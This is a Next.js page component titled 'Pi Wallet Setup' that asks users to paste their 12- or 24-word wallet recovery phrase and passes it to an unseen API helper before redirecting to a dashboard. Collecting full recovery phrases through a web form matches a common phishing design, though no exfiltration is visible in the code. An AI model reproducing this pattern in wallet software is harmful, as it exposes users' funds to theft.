'use client'
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { authenticateWithPi, getWalletAddress, getWalletBalance } from "../utils/piApi";

export default function Home() {
  const [secretPhrase, setSecretPhrase] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [balance, setBalance] = useState(null);
  const router = useRouter();

  useEffect(() => {
    // Check if user is already authenticated
    const checkAuth = async () => {
      try {
        const authResult = await authenticateWithPi();
        if (authResult && authResult.success) {
          // Check if we have stored wallet info
          const storedWalletInfo = localStorage.getItem('walletInfo');
          if (storedWalletInfo) {
            router.push('/dashboard');
          }
        }
      } catch (error) {
        console.error('Authentication error:', error);
      }
    };

    checkAuth();
  }, [router]);

  const validateSecretPhrase = (phrase) => {
    if (!phrase) return false;
    const words = phrase.trim().split(/\s+/);
    return words.length === 12 || words.length === 24;
  };

  const handleWalletSetup = async () => {
    if (!validateSecretPhrase(secretPhrase)) {
      setError("Please enter a valid 12 or 24 word secret phrase");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      // Get wallet address
      const address = await getWalletAddress(secretPhrase);
      setWalletAddress(address);

      // Get wallet balance
      const walletBalance = await getWalletBalance(address);
      setBalance(walletBalance);

      // Store wallet info
      localStorage.setItem('walletInfo', JSON.stringify({
        address,
        balance: walletBalance,
        timestamp: Date.now()
      }));

      router.push('/dashboard');
    } catch (error) {
      setError(error.message || "An unexpected error occurred. Please try again.");
      console.error(error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col items-center justify-center p-8 bg-gradient-to-br from-black to-zinc-900 text-white">
      <main className="flex flex-col gap-8 items-center backdrop-blur-lg bg-zinc-900/50 p-12 rounded-2xl shadow-2xl border border-zinc-800 relative w-full max-w-2xl">
        <h1 className="text-5xl font-bold text-white tracking-tight">
          Pi Wallet Setup
        </h1>
        
        <div className="flex flex-col gap-6 w-full">
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-zinc-400 mb-2">Secret Phrase</label>
              <textarea
                value={secretPhrase}
                onChange={(e) => setSecretPhrase(e.target.value)}
                placeholder="Enter your 12 or 24 word secret phrase"
                className="p-4 border bg-zinc-900/80 border-zinc-800 rounded-xl w-full focus:ring-2 focus:ring-white/20 focus:border-transparent outline-none transition-all placeholder:text-zinc-600 min-h-[120px] resize-none font-mono text-sm"
                spellCheck="false"
              />
              <p className="text-sm text-zinc-400 mt-2">
                Your secret phrase should be 12 or 24 words separated by spaces
              </p>
              {error && (
                <p className="text-sm text-red-500 mt-2">
                  {error}
                </p>
              )}
            </div>
          </div>

          {walletAddress && (
            <div className="space-y-2 p-4 bg-zinc-800/50 rounded-xl">
              <p className="text-sm font-medium text-zinc-400">Wallet Address:</p>
              <p className="text-sm font-mono break-all">{walletAddress}</p>
              {balance !== null && (
                <>
                  <p className="text-sm font-medium text-zinc-400 mt-2">Balance:</p>
                  <p className="text-sm font-mono">{balance} π</p>
                </>
              )}
            </div>
          )}

          <button
            onClick={handleWalletSetup}
            disabled={isLoading}
            className={`bg-white text-black px-8 py-4 rounded-xl transition-all duration-300 shadow-lg hover:shadow-white/10 ${
              isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-zinc-100'
            }`}
          >
            {isLoading ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                </svg>
                Setting up wallet...
              </span>
            ) : (
              'Continue to Dashboard'
            )}
          </button>
        </div>
      </main>
    </div>
  );
}
